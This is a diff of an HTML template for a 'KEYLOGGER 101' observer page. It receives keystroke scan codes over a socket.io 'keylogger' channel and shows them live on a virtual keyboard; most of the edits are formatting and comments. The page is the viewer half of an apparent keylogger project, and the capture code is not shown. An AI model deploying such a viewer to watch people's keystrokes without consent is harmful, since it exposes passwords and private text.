@@ -5,7 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Observer</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
     <style>
         body {
             background-color: grey;
@@ -45,7 +46,7 @@
             margin: 0 auto;
         }
 
-        .button{
+        .button {
             border-radius: 20px;
             background-color: grey;
             text-align: center;
@@ -67,7 +68,7 @@
             float: left;
             width: 20%;
             align-items: center;
-            display:table;
+            display: table;
             vertical-align: middle;
         }
 
@@ -78,9 +79,8 @@
             height: 100%;
         }
 
-        .
-        .column{
-            display:block
+        .column {
+            display: block;
             width: 3.3em;
         }
 
@@ -143,7 +143,7 @@
         .keyboard__row--h2>div {
             width: 1.75em;
         }
-        
+
         .keyboard__row--h3>div {
             height: 20em;
         }
@@ -247,7 +247,7 @@
             width: 3.3em;
         }
 
-        .key--arrow--up { 
+        .key--arrow--up {
             font-size: 0.6em;
             height: 1.8em;
             width: 3.3em;
@@ -255,7 +255,7 @@
             bottom: 0.5em;
         }
 
-        .key--arrow--down { 
+        .key--arrow--down {
             font-size: 0.6em;
             height: 1.8em;
             bottom: 3.5em;
@@ -271,7 +271,7 @@
         .keyboard>.keyboard__row {
             text-align: center;
         }
-        
+
         .a-container {
             padding: 1rem;
         }
@@ -279,12 +279,14 @@
         .a-container a {
             color: white;
         }
-
     </style>
+    <!-- Import Socket -->
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"
         integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO"
         crossorigin="anonymous"></script>
     <script>
+
+        // Function to call when adding the button to the live viewer when it clicked
         function appendNewButtonElement(scan_code) {
 
             htmlContent = document.getElementById("SC-" + scan_code).outerHTML.replace("SC-" + scan_code, "");
@@ -300,21 +302,31 @@
             // Scroll the container to the right
             container.scrollLeft = container.scrollWidth;
         }
+
         document.addEventListener('DOMContentLoaded', function () {
             const socket = io();
             const logContainer = document.getElementById('logContainer');
 
+            // Set up litener on the socket 'keylogger' channel
             socket.on('keylogger', function (data) {
                 console.log('Received keylogger:', data);
 
+                // Get the scan_code
                 var scan_code = data['data']['scan_code'];
+
+                // Find the associate button DOM
                 var buttonDOM = document.getElementById("SC-" + scan_code);
+
+                // Get the action "PRESS" or "RELEASE"
                 var action = data['data']['action'];
                 if (action == "PRESS") {
-                    
+                    // Add attribute press
                     buttonDOM.setAttribute('data-pressed', '');
+
+                    // Send the scan_code to live viewer as well
                     appendNewButtonElement(scan_code);
                 } else if (action == "RELEASE") {
+                    // Remove attribute press
                     buttonDOM.removeAttribute('data-pressed');
                 }
 
@@ -322,8 +334,7 @@
         });
     </script>
     <script>
-        function clearBox(elementID)
-        {
+        function clearBox(elementID) {
             document.getElementById(elementID).innerHTML = "";
         }
     </script>
@@ -335,14 +346,15 @@
         <div class="middle">
             <div class="row">
                 <div class="column--left">
-                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=http://{{ ip }}" class="mb-4" height="205"  />
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=http://{{ ip }}"
+                        class="mb-4" height="205" />
                 </div>
                 <div class="column--right">
                     <div class="container1">
                         <div class="row">
                             <h1>KEYLOGGER 101</h1>
                             <b>IP address: {{ ip }}</b>
-                        </div>       
+                        </div>
                         <div id="logContainer" class="keyboard__row"></div>
                     </div>
                 </div>
@@ -554,7 +566,7 @@
                         <span>Ctrl</span>
                     </div>
                     <div class="key--bottom-left key--word" id="SC-">
-                        <span>fn</span>  
+                        <span>fn</span>
                     </div>
                     <div class="key--bottom-left key--word key--w1" data-key="18" id="SC-125">
                         <span>option</span>
@@ -580,7 +592,7 @@
                                 <span>&#9650;</span>
                             </div>
                         </div>
-                        <div class="keyboard__row"> 
+                        <div class="keyboard__row">
                             <div data-key="37" class="key--arrow--down" id="SC-108">
                                 <span>&#9660;</span>
                             </div>
